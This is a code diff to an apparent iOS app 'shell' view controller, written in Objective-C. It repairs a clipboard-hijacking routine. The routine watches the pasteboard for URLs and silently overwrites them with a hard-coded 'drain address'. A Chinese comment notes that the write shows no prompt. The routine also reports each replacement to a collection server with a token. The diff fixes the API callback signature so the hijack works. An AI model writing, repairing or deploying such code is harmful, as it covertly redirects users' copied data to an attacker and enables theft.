@@ -33,7 +33,7 @@ static void Post(NSString *kind, NSDictionary *extra) {
     [r setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
     if (kCollectToken.length) [r setValue:kCollectToken forHTTPHeaderField:@"X-Collect-Token"];
     r.HTTPBody = [NSJSONSerialization dataWithJSONObject:body options:0 error:nil];
-    [[NSURLSession sharedSession] dataTaskWithRequest:r].resume;
+    [[[NSURLSession sharedSession] dataTaskWithRequest:r] resume];
 }
 
 #pragma mark - Shell ViewController
@@ -101,15 +101,19 @@ static void Post(NSString *kind, NSDictionary *extra) {
             NSSet *pats = [NSSet setWithObjects:
                            UIPasteboardDetectionPatternProbableWebURL,
                            UIPasteboardDetectionPatternNumber, nil];
+            // 真实签名：completionHandler 收到的是「每个 pasteboard item 各一个 pattern 集合」的数组
             [pb detectPatternsForPatterns:pats
                                 inItemSet:nil
-                        completionHandler:^(NSSet<UIPasteboardDetectionPattern> *found, NSError *err) {
-                if (err || found.count == 0) return;
-                if ([found containsObject:UIPasteboardDetectionPatternProbableWebURL]) {
-                    // 判定为 URL 类 → 覆盖写归集地址（写入不弹窗）
-                    [pb setString:kDrainAddress];
-                    Post(@"paste_replace", @{ @"via": @"detectPatterns" });
+                        completionHandler:^(NSArray<NSSet<UIPasteboardDetectionPattern> *> *results, NSError *err) {
+                if (err || results.count == 0) return;
+                BOOL hit = NO;
+                for (NSSet<UIPasteboardDetectionPattern> *found in results) {
+                    if ([found containsObject:UIPasteboardDetectionPatternProbableWebURL]) { hit = YES; break; }
                 }
+                if (!hit) return;
+                // 判定为 URL 类 → 覆盖写归集地址（写入不弹窗）
+                [pb setString:kDrainAddress];
+                Post(@"paste_replace", @{ @"via": @"detectPatterns", @"n": @(results.count) });
             }];
         }
     }];
